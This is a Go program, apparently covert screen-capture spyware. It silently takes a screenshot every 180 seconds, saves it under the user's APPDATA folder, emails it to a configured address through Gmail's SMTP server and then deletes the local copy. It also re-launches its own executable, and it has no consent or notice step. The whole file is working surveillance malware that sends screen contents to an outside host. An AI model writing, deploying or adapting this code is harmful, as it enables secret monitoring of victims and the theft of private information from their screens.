package main

import (
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/vova616/screenshot"
	"gopkg.in/gomail.v2"
)

// Define global variables for email credentials and screenshot file path
var (
	SenderEmail    = ""
	Password       = ""
	RecipientEmail = "" // Use SenderEmail as RecipientEmail
	Interval       = 180         // Interval in seconds
	AppDataPath    = os.Getenv("APPDATA")
	ScreenshotPath = filepath.Join(AppDataPath, "Temp.png")
)

func main() {
	// Define file_name using os.Args[0]
	fileName := os.Args[0]

	// Execute the file if file_name is not empty
	if fileName != "" {
		cmd := exec.Command(fileName)
		err := cmd.Start()
		if err != nil {
			fmt.Println("Error executing file:", err)
			return
		}
	}

	// Start taking screenshots
	go captureScreenshots()

	// Keep the main goroutine running
	select {}
}

func captureScreenshots() {
	for {
		// Capture screenshot
		img, err := screenshot.CaptureScreen()
		if err != nil {
			fmt.Println("Error capturing screenshot:", err)
			continue
		}

		// Save screenshot to file
		file, err := os.Create(ScreenshotPath)
		if err != nil {
			fmt.Println("Error creating screenshot file:", err)
			continue
		}
		defer file.Close()

		err = png.Encode(file, img)
		if err != nil {
			fmt.Println("Error encoding screenshot:", err)
			continue
		}

		// Send email with screenshot
		err = sendEmailWithAttachment(SenderEmail, Password, RecipientEmail, "Snaped..!", "Screenshot captured and sent.", ScreenshotPath)
		if err != nil {
			fmt.Println("Error sending email:", err)
		}

		// Delete the screenshot file
		err = os.Remove(ScreenshotPath)
		if err != nil {
			fmt.Println("Error deleting screenshot file:", err)
		}

		// Wait for the specified interval
		time.Sleep(time.Duration(Interval) * time.Second)
	}
}

func sendEmailWithAttachment(senderEmail, password, recipientEmail, subject, body, filePath string) error {
	// Create a new message
	msg := gomail.NewMessage()
	msg.SetHeader("From", senderEmail)
	msg.SetHeader("To", recipientEmail)
	msg.SetHeader("Subject", subject)
	msg.SetBody("text/plain", body)

	// Attach the file
	msg.Attach(filePath)

	// Create a mailer
	d := gomail.NewDialer("smtp.gmail.com", 587, senderEmail, password)

	// Send the email
	if err := d.DialAndSend(msg); err != nil {
		return err
	}

	return nil
}
